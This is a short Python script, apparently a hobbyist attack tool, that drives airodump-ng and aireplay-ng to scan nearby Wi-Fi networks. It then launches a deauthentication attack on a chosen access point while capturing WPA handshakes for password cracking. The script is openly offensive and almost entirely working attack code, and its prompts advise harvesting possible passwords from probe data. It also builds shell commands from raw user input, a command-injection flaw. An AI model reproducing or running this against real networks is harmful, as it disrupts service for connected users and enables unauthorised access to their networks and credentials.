# wifi_attack.py

import os

def scan_and_attack():
    """
    Scans nearby Wi-Fi networks, allows the user to select a target,
    and performs a deauthentication attack while capturing handshake packets.
    """
    cmd  = os.system("clear")
    print("\n=== Wifi Handshakke Capturing ===")
    print("\nEnter the interface:(Default >>(wlan0mon/wlan1mon))")
    interface = input("")
    order = "airodump-ng {} -M".format(interface)
    print("\nWhen Done Press CTRL+c")
    print("\nNote: Under Probe it might be Passwords So copy them to the worlist file")
    print("\nDon't Attack The Network if its Data is ZERO (you waste your time)")
    print("\nyou Can use 's' to arrange networks")
    cmd = os.system("sleep 7")
    geny = os.system(order)
    print("\nEnter the bssid of the target?")
    bssid = str(input(""))
    print("\nEnter the channel of the network?")
    channel = int(input())
    print("Enter the path of the output file ?")
    path = str(input(""))
    print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
    print("the number of the packets Depends on the Distance Between you and the network")
    dist = int(input(""))
    order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interface,bssid,channel,path,dist,bssid,interface)
    geny = os.system(order)